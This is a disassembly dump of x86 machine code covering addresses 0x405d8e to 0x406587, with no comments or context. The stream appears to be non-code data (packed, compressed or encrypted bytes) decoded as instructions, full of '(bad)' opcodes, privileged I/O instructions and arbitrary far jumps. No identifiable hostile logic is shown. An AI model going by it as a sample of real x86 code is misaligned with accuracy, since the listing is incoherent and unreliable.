  405d8e:	jns    0x405d53
  405d90:	push   ds
  405d91:	out    dx,al
  405d92:	not    WORD PTR [ebp-0x52264015]
  405d99:	pusha  
  405d9a:	mov    esp,0x2ff8229
  405d9f:	repz scas al,BYTE PTR es:[edi]
  405da1:	cmp    eax,0xc8e15e2a
  405da6:	ss js  0x405da7
  405da9:	pop    edi
  405daa:	sbb    esi,ebp
  405dac:	mov    esi,0xdbab51ed
  405db1:	rol    BYTE PTR [edi+ebp*1-0x18],0xfb
  405db6:	pop    edx
  405db7:	je     0x405de0
  405db9:	mov    ds:0x1d520708,al
  405dbe:	mov    ds:0x1188024c,eax
  405dc3:	retf   0x3bea
  405dc6:	mov    ds:0xfdd98f19,eax
  405dcb:	xchg   esp,eax
  405dcc:	mov    esp,0x7d31707d
  405dd1:	ror    DWORD PTR [edi-0x7f],1
  405dd4:	lds    esp,FWORD PTR gs:[ebx]
  405dd7:	test   DWORD PTR [edx-0x572d7275],edi
  405ddd:	jae    0x405df3
  405ddf:	push   es
  405de0:	add    eax,0x26d6df26
  405de5:	inc    ecx
  405de6:	pop    esp
  405de7:	inc    ecx
  405de8:	fsubr  QWORD PTR [esi+0x4d]
  405deb:	mov    esi,0x9a2f27ef
  405df0:	push   0x937d2d69
  405df5:	mov    ds:0xe50e346f,eax
  405dfa:	adc    DWORD PTR [edx+0x38199db9],0xffffffb7
  405e01:	fldcw  WORD PTR [edi+0x6f]
  405e04:	sbb    al,0x65
  405e06:	icebp  
  405e07:	fisubr DWORD PTR [ebp+0x5b]
  405e0a:	mov    edx,?
  405e0c:	jle    0x405e20
  405e0e:	adc    eax,eax
  405e10:	je     0x405df6
  405e12:	push   es
  405e13:	ja     0x405e20
  405e15:	add    DWORD PTR [esi+0x39],esi
  405e18:	lods   eax,DWORD PTR ds:[esi]
  405e19:	fnstcw WORD PTR [esi+0x79]
  405e1c:	lea    ebp,[eax]
  405e1e:	repnz rol BYTE PTR [esi-0x19],0xab
  405e23:	mov    bl,0x7e
  405e25:	sti    
  405e26:	mov    ah,0x9c
  405e28:	mov    esp,0xcd1c1761
  405e2d:	pop    ds
  405e2e:	sbb    eax,0x43382083
  405e33:	test   eax,0x1f645019
  405e38:	enter  0xbe92,0xce
  405e3c:	pop    edx
  405e3d:	mov    ds:0xa31a6079,eax
  405e42:	sbb    eax,0x4a29d3ec
  405e47:	jae    0x405dff
  405e49:	cld    
  405e4a:	mov    ebx,0xced5f725
  405e4f:	(bad)  
  405e50:	sbb    bl,BYTE PTR [eax-0x6a]
  405e53:	sbb    al,0x9
  405e55:	ds (bad) 
  405e58:	mov    ah,0x66
  405e5a:	jp     0x405e79
  405e5c:	pop    ss
  405e5d:	add    BYTE PTR [ecx-0x479720f9],cl
  405e63:	dec    ebp
  405e64:	mov    bh,0x5f
  405e66:	clc    
  405e67:	fwait
  405e68:	inc    esp
  405e69:	sbb    eax,0xa74d820b
  405e6e:	xchg   esi,eax
  405e6f:	cli    
  405e70:	and    DWORD PTR [esi-0x13],0x3e
  405e74:	or     bl,BYTE PTR [ebx-0x6d]
  405e77:	mov    dh,0xf4
  405e79:	dec    esi
  405e7a:	imul   ch
  405e7c:	(bad)  
  405e7d:	xchg   edi,eax
  405e7e:	mov    dl,0x41
  405e80:	int3   
  405e81:	sub    edi,DWORD PTR [ecx+ebp*1+0x5c]
  405e85:	cs test eax,0x668ce1c0
  405e8b:	je     0x405e14
  405e8d:	push   ecx
  405e8e:	out    0x72,al
  405e90:	call   0xfa54:0xe44f25cc
  405e97:	adc    BYTE PTR [edi+0x18],ah
  405e9a:	call   0x8e30:0x463640d1
  405ea1:	icebp  
  405ea2:	pusha  
  405ea3:	mov    fs,WORD PTR [ebp-0x31fe9140]
  405ea9:	mov    edi,0x9bc5825a
  405eae:	push   edx
  405eaf:	push   edx
  405eb0:	jbe    0x405ec4
  405eb2:	mov    ah,0x1b
  405eb4:	dec    eax
  405eb5:	pop    esp
  405eb6:	fstp   DWORD PTR [ebx+0x1b]
  405eb9:	sar    BYTE PTR [eax-0x5d42eb81],cl
  405ebf:	sbb    al,0x5e
  405ec1:	ror    BYTE PTR [eax+0x62d50859],cl
  405ec7:	jecxz  0x405f1f
  405ec9:	mov    ds:0xfa5b6742,eax
  405ece:	pop    es
  405ecf:	cmp    al,dh
  405ed1:	inc    eax
  405ed2:	and    eax,0xee0a59b6
  405ed7:	jl     0x405f11
  405ed9:	pop    ecx
  405eda:	call   0xc4fde9d
  405edf:	add    al,0x8f
  405ee1:	ret    0x302
  405ee4:	dec    edi
  405ee5:	rol    DWORD PTR [ecx-0x42c0da1f],1
  405eeb:	inc    edi
  405eec:	mov    esp,0xd72465b0
  405ef1:	pop    esp
  405ef2:	dec    eax
  405ef3:	imul   esi,DWORD PTR [esp+eiz*4-0x2b82e1ca],0x57e49244
  405efe:	ins    DWORD PTR es:[edi],dx
  405eff:	lods   eax,DWORD PTR ds:[esi]
  405f00:	mov    BYTE PTR [ebx+0x7e],bh
  405f03:	in     al,dx
  405f04:	shr    BYTE PTR [edx+0x3e41d2a9],0x50
  405f0b:	dec    ebp
  405f0c:	sbb    DWORD PTR [ebx+eiz*8],0xffffffad
  405f10:	push   ebx
  405f11:	aad    0x54
  405f13:	test   eax,0x959aa490
  405f18:	jle    0x405edc
  405f1a:	push   ss
  405f1b:	inc    ecx
  405f1c:	pop    ebx
  405f1d:	xchg   ebp,eax
  405f1e:	mov    al,BYTE PTR [ebp+0x113b711f]
  405f24:	adc    eax,0x9af36a6a
  405f29:	fwait
  405f2a:	lods   eax,DWORD PTR ds:[esi]
  405f2b:	rcl    BYTE PTR [ebx+0x3106ea9],0x17
  405f32:	stos   BYTE PTR es:[edi],al
  405f33:	inc    ecx
  405f34:	stc    
  405f35:	inc    esp
  405f36:	sbb    DWORD PTR ds:[edi],esp
  405f39:	(bad)  
  405f3a:	and    al,0xc2
  405f3c:	sbb    al,BYTE PTR [ebx+ebx*2]
  405f3f:	jmp    0x8369:0x5e7498a6
  405f46:	(bad)  
  405f47:	in     al,0xef
  405f49:	popa   
  405f4a:	push   esp
  405f4b:	retf   0xc6c6
  405f4e:	popa   
  405f4f:	jne    0x405ee6
  405f51:	out    0x5e,eax
  405f53:	pusha  
  405f54:	push   esp
  405f55:	ror    BYTE PTR [edi+0xced048d],cl
  405f5b:	imul   edx,esp,0x6258ab9
  405f61:	(bad)  
  405f62:	jg     0x405fc9
  405f64:	and    ebx,DWORD PTR [eax]
  405f66:	cli    
  405f67:	sbb    BYTE PTR [ecx-0x30994197],dl
  405f6d:	cld    
  405f6e:	retf   0x6d14
  405f71:	clc    
  405f72:	fdiv   st,st(2)
  405f74:	push   edx
  405f75:	into   
  405f76:	fs call 0x3fe0:0x94d
  405f7d:	(bad)  
  405f7e:	leave  
  405f7f:	cmp    BYTE PTR [ebx+ebp*8-0x360dd441],dl
  405f86:	es dec esi
  405f88:	ret    0x74d6
  405f8b:	into   
  405f8c:	mov    dh,0xd8
  405f8e:	sar    BYTE PTR [eax],0x51
  405f91:	mov    edi,DWORD PTR [edx]
  405f93:	add    eax,DWORD PTR [ebp-0x216b7ce2]
  405f99:	ss or  al,0x4c
  405f9c:	mov    ah,0xc4
  405f9e:	ret    0xef03
  405fa1:	adc    ch,dl
  405fa3:	retf   0xe3b7
  405fa6:	sub    bh,0xd2
  405fa9:	mov    ebx,0x9c226e6d
  405fae:	mov    dh,0xf3
  405fb0:	mov    edi,0xaa144d2e
  405fb5:	pop    eax
  405fb6:	jg     0x405f43
  405fb8:	xlat   BYTE PTR ds:[ebx]
  405fb9:	bound  eax,QWORD PTR [ebx-0x6b]
  405fbc:	xchg   ebx,eax
  405fbd:	imul   esp,DWORD PTR ds:0x75e7f01d,0x6cf1c56b
  405fc7:	imul   ecx,DWORD PTR [edx-0x5a7f4da7],0xd793c34a
  405fd1:	ins    DWORD PTR es:[edi],dx
  405fd2:	xor    eax,0x511d480d
  405fd7:	test   DWORD PTR [ebx],ebp
  405fd9:	jno    0x405fd8
  405fdb:	mov    ch,0x17
  405fdd:	inc    ecx
  405fde:	pop    es
  405fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fe0:	mov    edi,0xb3ecbad7
  405fe5:	daa    
  405fe6:	(bad)  
  405fe7:	inc    edi
  405fe8:	inc    eax
  405fe9:	das    
  405fea:	sub    al,bh
  405fec:	retf   0x65db
  405fef:	sub    esi,DWORD PTR ds:0x30b29e91
  405ff5:	scas   al,BYTE PTR es:[edi]
  405ff6:	cmp    BYTE PTR [esi],cl
  405ff8:	mov    esi,0xc264deb8
  405ffd:	test   eax,0xf8add507
  406002:	popa   
  406003:	push   edx
  406004:	sub    al,0xa2
  406006:	mov    edx,ebx
  406008:	xchg   ebx,eax
  406009:	pop    edx
  40600a:	push   edi
  40600b:	jmp    0x406051
  40600d:	jnp    0x405f9b
  40600f:	sbb    DWORD PTR [eax+0x7],ebp
  406012:	pminub mm0,QWORD PTR [edx]
  406015:	les    eax,FWORD PTR [eax+eax*8-0x14]
  406019:	int3   
  40601a:	sbb    BYTE PTR [edi],0xa1
  40601d:	push   ebx
  40601e:	and    bl,cl
  406020:	inc    ecx
  406021:	or     ecx,DWORD PTR [esi-0x60]
  406024:	sub    edx,DWORD PTR [eax+0x57]
  406027:	(bad)  
  406029:	add    al,0x96
  40602b:	mov    ch,0x96
  40602d:	cli    
  40602e:	gs cmp al,0xb9
  406031:	outs   dx,DWORD PTR cs:[esi]
  406033:	std    
  406034:	popf   
  406035:	sbb    DWORD PTR [ebp-0xe],esi
  406038:	icebp  
  406039:	pop    edx
  40603a:	xchg   esp,eax
  40603b:	sbb    esp,DWORD PTR [eax+0x4d56af75]
  406041:	outs   dx,DWORD PTR ds:[esi]
  406042:	lahf   
  406043:	es popf 
  406045:	cdq    
  406046:	push   ebx
  406047:	inc    ebx
  406048:	shr    ah,cl
  40604a:	sbb    eax,0x5e283e1f
  40604f:	imul   edx,DWORD PTR [edi+0x69ab6569],0xffffffeb
  406056:	mov    ecx,0x4f0c1a59
  40605b:	scas   al,BYTE PTR es:[edi]
  40605c:	inc    eax
  40605d:	loop   0x406007
  40605f:	fstp   TBYTE PTR [esi+edi*4+0x36970d98]
  406066:	(bad)  
  406067:	jmp    0x70f9:0xcce15270
  40606e:	(bad)  [eax+0x27008c50]
  406074:	mov    ch,0xc7
  406076:	jg     0x4060ca
  406078:	jnp    0x406094
  40607a:	stc    
  40607b:	sbb    DWORD PTR [ebx-0x60],0xfffffffa
  40607f:	lea    ebx,[edi]
  406081:	adc    BYTE PTR [ebx-0x2a54383b],ch
  406087:	xchg   esi,eax
  406088:	int3   
  406089:	sub    cl,ch
  40608b:	fxch   st(1)
  40608d:	mov    ebp,0x7db715b
  406092:	hlt    
  406093:	cmp    BYTE PTR [ebp+0x62551f97],cl
  406099:	cmc    
  40609a:	mov    ebx,0xe8944125
  40609f:	xchg   edi,eax
  4060a0:	jns    0x4060e9
  4060a2:	into   
  4060a3:	ret    
  4060a4:	push   ds
  4060a5:	jg     0x406043
  4060a7:	jge    0x4060f9
  4060a9:	mov    ebp,0xd663f8cf
  4060ae:	sti    
  4060af:	popa   
  4060b0:	sbb    BYTE PTR [edx],0xce
  4060b3:	lods   al,BYTE PTR ds:[esi]
  4060b4:	xchg   edi,eax
  4060b5:	fisub  DWORD PTR [ecx+eiz*2+0x4d]
  4060b9:	and    eax,0xb124862c
  4060be:	add    al,0x9d
  4060c0:	push   esp
  4060c1:	pop    eax
  4060c2:	xor    bl,BYTE PTR [edi]
  4060c4:	mov    DWORD PTR [edi],ebp
  4060c6:	jg     0x40606d
  4060c8:	cmp    edx,DWORD PTR [edx-0x6c]
  4060cb:	push   esp
  4060cc:	fistp  DWORD PTR [ebx+eiz*2+0x552101fd]
  4060d3:	mov    DWORD PTR [ecx-0x46],edi
  4060d6:	adc    ebx,DWORD PTR [ebx]
  4060d8:	sbb    BYTE PTR [ecx-0x3e36415f],dh
  4060de:	push   esp
  4060df:	or     al,BYTE PTR [ebp+edx*4-0x5e]
  4060e3:	add    dl,ah
  4060e5:	adc    BYTE PTR [edx-0x7c793c04],bl
  4060eb:	rcr    BYTE PTR [ecx+0x46],1
  4060ee:	push   cs
  4060ef:	pushf  
  4060f0:	mov    DWORD PTR [ebx+0x46],esp
  4060f3:	mov    ecx,ds
  4060f5:	sbb    eax,0xd26601d
  4060fa:	loope  0x406152
  4060fc:	inc    esp
  4060fd:	cs ss inc esp
  406100:	jmp    0xbb1a:0xc1255928
  406107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406108:	out    0x47,eax
  40610a:	imul   esp,DWORD PTR [edx],0x2d
  40610d:	(bad)  
  40610e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40610f:	and    DWORD PTR [ebp-0x42e5e8d9],ebx
  406115:	outs   dx,BYTE PTR ds:[esi]
  406116:	cli    
  406117:	cmc    
  406118:	inc    ebp
  406119:	cmp    eax,DWORD PTR [ebx]
  40611b:	jle    0x40613d
  40611d:	xor    ebx,edx
  40611f:	push   ebp
  406120:	ds mov ebx,0x899253ef
  406126:	and    ch,BYTE PTR [edi-0x70]
  406129:	pop    ss
  40612a:	test   DWORD PTR [ecx+0x59],eax
  40612d:	xor    al,0x97
  40612f:	test   al,0xd7
  406131:	leave  
  406132:	mov    WORD PTR ds:0x69f25692,?
  406138:	dec    edi
  406139:	scas   al,BYTE PTR es:[edi]
  40613a:	dec    ecx
  40613b:	jmp    0xc77b8810
  406140:	or     al,0x83
  406142:	rol    DWORD PTR [edi-0x47],cl
  406145:	xchg   ebx,eax
  406146:	mov    esp,0x79ad8753
  40614b:	jne    0x4060d8
  40614d:	inc    edx
  40614e:	dec    eax
  40614f:	mov    al,0xa9
  406151:	outs   dx,BYTE PTR ds:[esi]
  406152:	pusha  
  406153:	pop    ecx
  406154:	bound  ecx,QWORD PTR [edx+0x38]
  406157:	in     eax,0x4f
  406159:	aas    
  40615a:	cdq    
  40615b:	xchg   edi,eax
  40615c:	mov    WORD PTR [esi+0x5e],ss
  40615f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406160:	mov    dh,0xaf
  406162:	push   edi
  406163:	fistp  WORD PTR [eax-0x4871857]
  406169:	test   esi,0x76c82cac
  40616f:	xor    ah,BYTE PTR [eax]
  406171:	(bad)  
  406172:	mov    BYTE PTR [ebx+edi*1+0x335bab60],dl
  406179:	inc    esp
  40617a:	xor    edi,ecx
  40617c:	inc    ebp
  40617d:	mul    DWORD PTR [ecx-0x1a638dd3]
  406183:	dec    ebx
  406184:	pop    edi
  406185:	dec    ebx
  406186:	out    0x38,eax
  406188:	sbb    ch,BYTE PTR ds:0x4b3de763
  40618e:	call   0x9523:0xc8dcf24e
  406195:	mov    ebp,DWORD PTR [edx+0x8]
  406198:	pop    edi
  406199:	fcom   QWORD PTR [eax+0x1b]
  40619c:	xchg   esi,eax
  40619d:	icebp  
  40619e:	inc    edx
  40619f:	mov    cl,0xf9
  4061a1:	pop    ds
  4061a2:	and    bl,ah
  4061a4:	push   ecx
  4061a5:	mov    al,ds:0x1ce3c9f5
  4061aa:	fdiv   st(6),st
  4061ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061ad:	test   BYTE PTR [ebx+0x4ec6a5f],ah
  4061b3:	mov    bl,0xdc
  4061b5:	and    ah,BYTE PTR [ebx+0x7ee5ef46]
  4061bb:	xchg   edx,eax
  4061bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061bd:	dec    ecx
  4061be:	cld    
  4061bf:	(bad)  
  4061c0:	mov    ebp,edx
  4061c2:	stc    
  4061c3:	call   0x10eb:0x4274c540
  4061ca:	into   
  4061cb:	popa   
  4061cc:	xchg   eax,ebp
  4061ce:	loopne 0x40615f
  4061d0:	sbb    eax,0xf60b9710
  4061d5:	mov    ds:0xfa28b420,eax
  4061da:	sti    
  4061db:	cmp    DWORD PTR [ecx+0x687a8c20],edx
  4061e1:	lea    eax,[esp+edx*1+0x1f]
  4061e5:	sub    bh,BYTE PTR [ecx+0x2123390e]
  4061eb:	jg     0x4061cf
  4061ed:	jns    0x40625f
  4061ef:	cmp    eax,0x8a553bf1
  4061f4:	inc    ebp
  4061f5:	sbb    BYTE PTR [ecx+0x12],ch
  4061f8:	fs xchg esi,eax
  4061fa:	fcomp  DWORD PTR [edx-0x1e60d0ad]
  406200:	pop    ds
  406201:	icebp  
  406202:	out    dx,al
  406203:	adc    BYTE PTR [ebp+0x1d61ee80],dh
  406209:	mov    edi,0xd0ab8746
  40620e:	mov    esi,0xce04fd4c
  406213:	rcr    DWORD PTR ss:[edx-0xf],cl
  406217:	xor    ebp,DWORD PTR [esi+0x2965746d]
  40621d:	jge    0x4061ee
  40621f:	fstp   DWORD PTR [ebx+eiz*4-0x28dc1374]
  406226:	push   esi
  406227:	dec    eax
  406228:	xchg   ecx,eax
  406229:	push   eax
  40622a:	jno    0x4061e6
  40622c:	rcr    edi,1
  40622e:	mov    DWORD PTR [eax-0x40935614],eax
  406234:	stos   DWORD PTR es:[edi],eax
  406235:	mov    dl,0xfd
  406237:	(bad)  
  406238:	retf   
  406239:	lods   al,BYTE PTR ds:[esi]
  40623a:	xor    DWORD PTR [edx-0x7f],esp
  40623d:	aad    0x17
  40623f:	lds    edx,FWORD PTR [edi-0x324ca398]
  406245:	adc    bh,cl
  406247:	xchg   edi,eax
  406248:	jns    0x406294
  40624a:	push   edi
  40624b:	mov    ecx,0x8fa47020
  406250:	cmp    eax,0x7637cb6
  406255:	and    dl,bh
  406257:	inc    esi
  406258:	push   edx
  406259:	cmp    cl,al
  40625b:	push   edi
  40625c:	(bad)  [eax+0x76566d88]
  406262:	and    cl,dl
  406264:	adc    BYTE PTR [ebp-0x4b4d4844],al
  40626a:	leave  
  40626b:	daa    
  40626c:	call   0x8a29:0x2030d0c5
  406273:	int3   
  406274:	jl     0x406272
  406276:	cmp    eax,0xc9eb7e88
  40627b:	inc    edi
  40627c:	add    al,0xf6
  40627e:	es dec esp
  406280:	std    
  406281:	mov    edi,0xef7a732a
  406286:	and    al,0xf9
  406288:	bound  esi,QWORD PTR [edx-0x6a]
  40628b:	dec    edi
  40628c:	push   esi
  40628d:	xchg   esi,eax
  40628e:	sub    BYTE PTR [edi],dl
  406290:	dec    eax
  406291:	add    eax,0x41320e2f
  406296:	or     ecx,DWORD PTR [esi]
  406298:	mov    ds:0x8055bfc1,al
  40629d:	ss retf 
  40629f:	cdq    
  4062a0:	je     0x4062d6
  4062a2:	aas    
  4062a3:	aas    
  4062a4:	jne    0x4062d1
  4062a6:	mov    ebx,0xe287e1f2
  4062ab:	mov    bh,0x2f
  4062ad:	or     edx,DWORD PTR [ecx]
  4062af:	fdivr  DWORD PTR [eax]
  4062b1:	cmp    ah,ch
  4062b3:	push   ebp
  4062b4:	sub    eax,0xc730939a
  4062b9:	or     al,0x3d
  4062bc:	icebp  
  4062bd:	dec    esp
  4062be:	mov    ebp,ebx
  4062c0:	sbb    eax,0xf01b796e
  4062c5:	jge    0x40629e
  4062c7:	xchg   ebx,eax
  4062c8:	xchg   ebp,eax
  4062c9:	mov    cl,0x32
  4062cb:	mov    WORD PTR [eax-0x2605fc51],es
  4062d1:	in     eax,dx
  4062d2:	jnp    0x40632b
  4062d4:	and    edx,DWORD PTR [ecx+0x2d]
  4062d7:	call   0x41fe:0xa26bc230
  4062de:	repz push 0xffffffe3
  4062e1:	inc    ebp
  4062e2:	sub    esp,ebp
  4062e4:	sar    DWORD PTR [esi+0x6cce75f0],0xa5
  4062eb:	les    eax,FWORD PTR [edx+0x55]
  4062ee:	mov    ds:0x1d191c44,al
  4062f3:	mov    ebp,0x9bef194b
  4062f8:	mov    eax,ds:0x432ac963
  4062fd:	cmp    BYTE PTR [edx+eiz*2-0x740d7232],0x45
  406305:	sbb    DWORD PTR [eax-0x6698ac6d],ebp
  40630b:	mov    ds:0x3fbab19e,al
  406310:	pop    edi
  406311:	sbb    eax,0xc7bda393
  406316:	cmp    ch,BYTE PTR [ecx+0x1ecf186b]
  40631c:	mov    eax,ds:0x6ac350ac
  406321:	or     eax,0x970fbadc
  406326:	mov    ch,0x8f
  406328:	dec    edi
  406329:	(bad)  
  40632a:	clc    
  40632b:	add    DWORD PTR [edi-0x49b54b94],esi
  406331:	cmp    ch,BYTE PTR [edi+0x35acfc2d]
  406337:	xchg   cl,dl
  406339:	inc    edx
  40633a:	in     eax,dx
  40633b:	jp     0x4062d0
  40633d:	std    
  40633e:	xchg   ecx,eax
  40633f:	mov    dl,0xe0
  406341:	xchg   BYTE PTR [edx],bh
  406343:	(bad)  
  406345:	mov    al,ds:0x8f19fa6c
  40634a:	xor    BYTE PTR [ebx+0x6a],ah
  40634d:	dec    esi
  40634e:	cmp    ecx,ebx
  406350:	(bad)  
  406351:	loop   0x40633c
  406353:	inc    ecx
  406354:	adc    al,0x7c
  406356:	(bad)  
  406357:	mov    bh,BYTE PTR [ebx]
  406359:	rcl    BYTE PTR [edx-0x2b7d034e],0x8b
  406360:	jmp    0x78e7:0xf02c7e3b
  406367:	adc    BYTE PTR [eax-0xf719912],dh
  40636d:	add    ah,dl
  40636f:	push   ds
  406370:	push   ebx
  406371:	retf   0x2e7d
  406374:	or     al,0x36
  406376:	dec    ebx
  406377:	cmp    eax,DWORD PTR [esi+0x77]
  40637a:	and    eax,0x53332615
  40637f:	xchg   esi,eax
  406380:	dec    edi
  406381:	fdivr  DWORD PTR [ebx]
  406383:	int3   
  406384:	push   es
  406385:	sbb    bh,BYTE PTR [edx]
  406387:	loop   0x406350
  406389:	push   edi
  40638a:	aam    0x4c
  40638c:	inc    ecx
  40638d:	push   0x65
  40638f:	sahf   
  406390:	jp     0x4063c9
  406392:	pop    esp
  406393:	ja     0x40636e
  406395:	out    0x74,al
  406397:	cld    
  406398:	fcmovnb st,st(2)
  40639a:	inc    ebp
  40639b:	sbb    ebx,eax
  40639d:	mov    eax,ds:0x1f414ca8
  4063a2:	rcr    ebx,1
  4063a4:	push   edi
  4063a5:	xchg   DWORD PTR [ecx+0x5dcfb322],eax
  4063ab:	cmp    BYTE PTR [ecx-0xb99a25a],cl
  4063b1:	ins    BYTE PTR es:[edi],dx
  4063b2:	popa   
  4063b3:	pop    eax
  4063b4:	add    edi,ecx
  4063b6:	imul   ebx,DWORD PTR [edi-0x35],0xa18b4bca
  4063bd:	xchg   DWORD PTR [eax+0x24c56299],ecx
  4063c3:	jns    0x406373
  4063c5:	mov    BYTE PTR [ebx],ah
  4063c7:	push   0xa88003c9
  4063cc:	lods   eax,DWORD PTR ds:[esi]
  4063cd:	lock add bh,BYTE PTR [ecx-0x9]
  4063d1:	mov    BYTE PTR [ebx+0x5de4d0c3],ah
  4063d7:	adc    al,0x56
  4063d9:	mov    eax,ds:0x28760ccf
  4063de:	lahf   
  4063df:	mov    al,0x5b
  4063e1:	ficomp WORD PTR [eax+0x25]
  4063e4:	ss cmp eax,0x397c8662
  4063ea:	sub    eax,0xb6eabf90
  4063ef:	mov    dh,0x7f
  4063f1:	pop    esi
  4063f2:	jmp    0x4063f7
  4063f4:	xchg   edx,eax
  4063f5:	shr    DWORD PTR [ebx],0xa4
  4063f8:	popf   
  4063f9:	push   ecx
  4063fa:	lods   eax,DWORD PTR ds:[esi]
  4063fb:	sub    bh,BYTE PTR [eax+0x29]
  4063fe:	(bad)  
  4063ff:	push   ss
  406400:	mov    eax,0xcc75338
  406405:	retf   
  406406:	repnz add al,0xa9
  406409:	loop   0x406397
  40640b:	pop    eax
  40640c:	ds pop es
  40640e:	mov    ebx,0x5fa6b9b
  406413:	ins    DWORD PTR es:[edi],dx
  406414:	les    edi,FWORD PTR [eax+0x5e7c6b43]
  40641a:	clc    
  40641b:	arpl   WORD PTR [esp+ebp*1+0x21],bp
  40641f:	jns    0x40646f
  406421:	dec    edi
  406422:	and    BYTE PTR [eax+0x3],ah
  406425:	push   esi
  406426:	lods   al,BYTE PTR ds:[esi]
  406427:	arpl   WORD PTR cs:[esi],ax
  40642a:	and    bl,BYTE PTR [esp+edx*2-0x43]
  40642e:	pop    eax
  40642f:	push   esp
  406430:	add    eax,0xf323603a
  406435:	jle    0x406416
  406437:	inc    edx
  406438:	dec    edi
  406439:	mov    bh,0xf2
  40643b:	inc    ebp
  40643c:	jo     0x406485
  40643e:	es xor al,0x94
  406441:	(bad)  
  406442:	imul   BYTE PTR [edi]
  406444:	(bad)  
  406445:	lods   al,BYTE PTR ds:[esi]
  406446:	iret   
  406447:	pusha  
  406448:	jnp    0x406446
  40644a:	xchg   edx,eax
  40644b:	adc    al,0x91
  40644d:	aam    0x4d
  40644f:	push   cs
  406450:	ret    
  406451:	jbe    0x4064cb
  406453:	stos   DWORD PTR es:[edi],eax
  406454:	scas   eax,DWORD PTR es:[edi]
  406455:	loop   0x40647a
  406457:	mov    bl,0x52
  406459:	adc    dh,al
  40645b:	and    dl,dh
  40645d:	xchg   ecx,eax
  40645e:	ins    BYTE PTR es:[edi],dx
  40645f:	inc    ecx
  406460:	in     eax,0xa3
  406462:	fwait
  406463:	in     al,0x57
  406465:	mov    esp,0x56feba3
  40646a:	xlat   BYTE PTR ds:[ebx]
  40646b:	jle    0x4063f9
  40646d:	lds    edx,FWORD PTR [edi-0x7c6c26cc]
  406473:	std    
  406474:	adc    BYTE PTR [esi+0x409992ab],ch
  40647a:	and    DWORD PTR [eax-0x28],esi
  40647d:	xor    eax,0x10293e58
  406482:	ret    0x226
  406485:	pop    ecx
  406486:	xor    ah,cl
  406488:	lock repnz ds leave 
  40648c:	push   edi
  40648d:	xor    DWORD PTR [esi],ebp
  40648f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406490:	out    0xb2,eax
  406492:	and    eax,0x4449c05
  406497:	mov    edi,0x946fe95e
  40649c:	dec    edx
  40649d:	sub    dl,al
  40649f:	cdq    
  4064a0:	imul   ebp,DWORD PTR [edi],0x5b
  4064a3:	loop   0x4064e3
  4064a5:	lods   al,BYTE PTR ds:[esi]
  4064a6:	jnp    0x406460
  4064a8:	fwait
  4064a9:	push   0x9a8cafb4
  4064ae:	test   al,0xf8
  4064b0:	(bad)  
  4064b1:	out    0x7d,eax
  4064b3:	or     ah,BYTE PTR [edx+ebx*4]
  4064b6:	inc    edi
  4064b7:	js     0x4064ba
  4064b9:	lahf   
  4064ba:	pop    eax
  4064bb:	(bad)  
  4064bc:	adc    edx,DWORD PTR [edx]
  4064be:	push   ecx
  4064bf:	push   ebp
  4064c0:	push   ss
  4064c1:	in     al,dx
  4064c2:	ds sti 
  4064c4:	jle    0x4064c9
  4064c6:	mov    edi,0xa98768dd
  4064cb:	adc    dh,BYTE PTR [edx-0x46]
  4064ce:	ret    
  4064cf:	in     al,dx
  4064d0:	cli    
  4064d1:	clc    
  4064d2:	push   ds
  4064d3:	sub    eax,0xa7260385
  4064d8:	(bad)  
  4064d9:	(bad)  
  4064da:	dec    esi
  4064db:	data16 sub dh,BYTE PTR [edi]
  4064de:	fs pushf 
  4064e0:	inc    esi
  4064e1:	xor    edi,ecx
  4064e3:	ret    0xfe5e
  4064e6:	cmc    
  4064e7:	(bad)  
  4064e9:	je     0x406520
  4064eb:	mov    eax,ds:0x67fac884
  4064f0:	add    al,0xc4
  4064f2:	lock xchg DWORD PTR [ebx+0x7f],esi
  4064f6:	jno    0x406501
  4064f8:	sahf   
  4064f9:	xor    BYTE PTR [ebp-0x2f],cl
  4064fc:	fwait
  4064fd:	mov    ds:0x10c11a14,eax
  406502:	std    
  406503:	push   edx
  406504:	outs   dx,BYTE PTR ds:[esi]
  406505:	jae    0x406571
  406507:	cdq    
  406508:	retf   
  406509:	ret    
  40650a:	xor    eax,edx
  40650c:	push   cs
  40650d:	test   DWORD PTR [ebp+0x22],esp
  406510:	ins    BYTE PTR es:[edi],dx
  406511:	pop    ss
  406512:	jp     0x406506
  406514:	out    0xf7,al
  406516:	push   ss
  406517:	mov    ch,cl
  406519:	repz and eax,0x8cd3a53f
  40651f:	xchg   ecx,eax
  406521:	pop    ss
  406522:	rcl    DWORD PTR [edi-0x969b39d],1
  406528:	ins    DWORD PTR es:[edi],dx
  406529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40652a:	pop    esp
  40652b:	loopne 0x40655b
  40652d:	imul   ebx,DWORD PTR ds:0x65c67c76,0x21
  406534:	shl    cl,1
  406536:	or     al,0x33
  406538:	out    dx,eax
  406539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40653a:	or     al,0x52
  40653c:	pop    ss
  40653d:	xchg   ebx,eax
  40653e:	sub    edx,DWORD PTR [ebx-0x46fe5ef8]
  406544:	sub    eax,esp
  406546:	and    al,0xf9
  406548:	dec    ebx
  406549:	jns    0x406545
  40654b:	sbb    eax,0x2ba71e3b
  406550:	fwait
  406551:	pop    esi
  406552:	ins    BYTE PTR es:[edi],dx
  406553:	xchg   esi,eax
  406554:	retf   
  406555:	sub    al,0xba
  406557:	push   ecx
  406558:	inc    esi
  406559:	pop    ebp
  40655a:	fsub   st(3),st
  40655c:	jp     0x4064ff
  40655e:	out    dx,al
  40655f:	xchg   BYTE PTR [edx+0x4e],ch
  406562:	rcr    esi,1
  406564:	icebp  
  406565:	cmp    edi,DWORD PTR [eax-0x28]
  406568:	jmp    0xa864:0x98346071
  40656f:	pop    ebx
  406570:	in     eax,dx
  406571:	cld    
  406572:	cmp    al,BYTE PTR [edi-0x25e57df8]
  406578:	mov    esp,0x594f445d
  40657d:	in     al,dx
  40657e:	mov    ebp,edx
  406580:	jg     0x4065e4
  406582:	imul   ecx,eax,0x15
  406585:	jp     0x40659e
  406587:	adc    BYTE PTR [esi],cl
